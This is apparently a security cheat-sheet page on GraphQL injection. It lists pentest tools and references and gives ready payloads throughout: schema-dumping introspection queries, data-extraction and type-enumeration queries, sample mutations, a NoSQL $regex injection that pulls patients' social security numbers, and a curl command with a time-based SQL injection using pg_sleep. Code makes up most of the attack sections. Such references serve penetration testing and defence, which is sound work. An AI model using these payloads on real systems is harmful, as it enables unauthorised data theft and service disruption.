# GraphQL injection

> GraphQL is a query language for APIs and a runtime for fulfilling those queries with existing data.


## Summary

* [Tools](#tools)
* [Exploit](#exploit)
  * [Identify an injection point](#identify-an-injection-point)
  * [Enumerate Database Schema via Instropection](#enumerate-database-schema-via-introspection)
  * [Extract data](#extract-data)
  * [Enumerate the types' definition](#enumerate-the-type-definition)
  * [Use mutations](#use-mutations)
  * [NOSQL injection](#nosql-injection)
  * [SQL injection](#sql-injection)
* [References](#references)

## Tools

* [GraphQLmap - Scripting engine to interact with a graphql endpoint for pentesting purposes](https://github.com/swisskyrepo/GraphQLmap)
* [GraphQL Security Toolkit - GraphQL Security Research Material](https://github.com/doyensec/graph-ql/)
* [GraphQL IDE - An extensive IDE for exploring GraphQL API's](https://github.com/andev-software/graphql-ide)

## Exploit

### Identify an injection point

Most of the time the graphql is located on the `/graphql` or `/graphiql` endpoint.

```js
example.com/graphql?query={__schema{types{name}}}
```

Check if errors are visible.

```javascript
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```


### Enumerate Database Schema via Introspection

URL encoded query to dump the database schema.

```js
fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
```

URL decoded query to dump the database schema.

```javascript
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}

query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
```


### Extract data

```js
example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
```

![HTB Help - GraphQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/Images/htb-help.png?raw=true)


### Enumerate the types' definition 

Enumerate the definition of interesting types using the following GraphQL query, replacing "User" with the chosen type

```javascript
{__type (name: "User") {name fields{name type{name kind ofType{name kind}}}}}
```

### Use mutations

Mutations work like function, you can use them to interact with the GraphQL.

```javascript
# mutation{signIn(login:"Admin", password:"secretp@ssw0rd"){token}}
# mutation{addUser(id:"1", name:"Dan Abramov", email:"dan@dan.com") {id name email}}
```

### NOSQL injection

Use `$regex`, `$ne` from []() inside a `search` parameter.

```json
{
  doctors(
    options: "{\"limit\": 1, \"patients.ssn\" :1}", 
    search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }")
    {
      firstName lastName id patients{ssn}
    }
}
```


### SQL injection

Simple SQL injection inside a graphql field.

```powershell
curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```


## References

* [Introduction to GraphQL](https://graphql.org/learn/)
* [GraphQL Introspection](https://graphql.org/learn/introspection/)
* [API Hacking GraphQL - @ghostlulz - jun 8, 2019](https://medium.com/@ghostlulzhacks/api-hacking-graphql-7b2866ba1cf2)
* [GraphQL abuse: Bypass account level permissions through parameter smuggling - March 14, 2018 - @Detectify](https://labs.detectify.com/2018/03/14/graphql-abuse/)
* [Discovering GraphQL endpoints and SQLi vulnerabilities - Sep 23, 2018 - Matías Choren](https://medium.com/@localh0t/discovering-graphql-endpoints-and-sqli-vulnerabilities-5d39f26cea2e)
* [Securing Your GraphQL API from Malicious Queries - Feb 21, 2018 - Max Stoiber](https://blog.apollographql.com/securing-your-graphql-api-from-malicious-queries-16130a324a6b)
* [GraphQL NoSQL Injection Through JSON Types - June 12, 2017 - Pete Corey](http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/)
* [SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter - Nov 6th 2018 - @jobert](https://hackerone.com/reports/435066)
* [Looting GraphQL Endpoints for Fun and Profit - @theRaz0r](https://raz0r.name/articles/looting-graphql-endpoints-for-fun-and-profit/)
* [How to set up a GraphQL Server using Node.js, Express & MongoDB - 5 NOVEMBER 2018 - Leonardo Maldonado](https://www.freecodecamp.org/news/how-to-set-up-a-graphql-server-using-node-js-express-mongodb-52421b73f474/)
* [GraphQL cheatsheet - DEVHINTS.IO](https://devhints.io/graphql)
* [HIP19 Writeup - Meet Your Doctor 1,2,3 - June 22, 2019 - Swissky](https://swisskyrepo.github.io/HIP19-MeetYourDoctor/)